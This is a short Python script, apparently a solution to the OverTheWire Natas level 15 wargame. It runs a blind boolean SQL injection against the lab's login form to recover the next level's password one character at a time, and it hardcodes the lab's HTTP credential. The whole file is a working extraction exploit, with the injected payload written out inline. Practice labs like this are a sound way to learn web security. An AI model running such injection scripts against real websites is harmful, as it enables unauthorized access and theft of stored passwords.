#!/usr/bin/env python3
import requests
import string

URL = "http://natas15.natas.labs.overthewire.org/index.php"
AUTH = ("natas15", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

TRUE_STRING = "This user exists."
CHARSET = string.ascii_letters + string.digits
MAX_LEN = 32


def check_prefix(prefix):
    payload = f'natas16" AND password LIKE "{prefix}%" -- '
    r = requests.post(URL, auth=AUTH, data={"username": payload})
    return TRUE_STRING in r.text


def extract_password():
    print("[*] Starting Natas15 extraction...\n")
    extracted = ""

    for pos in range(1, MAX_LEN + 1):
        found = False

        for ch in CHARSET:
            if check_prefix(extracted + ch):
                extracted += ch
                print(f"[+] Position {pos}: {ch}  →  {extracted}")
                found = True
                break

        if not found:
            print("[!] No further characters found.")
            break

    print("\n[✓] Password recovered:")
    print(extracted)


if __name__ == "__main__":
    extract_password()
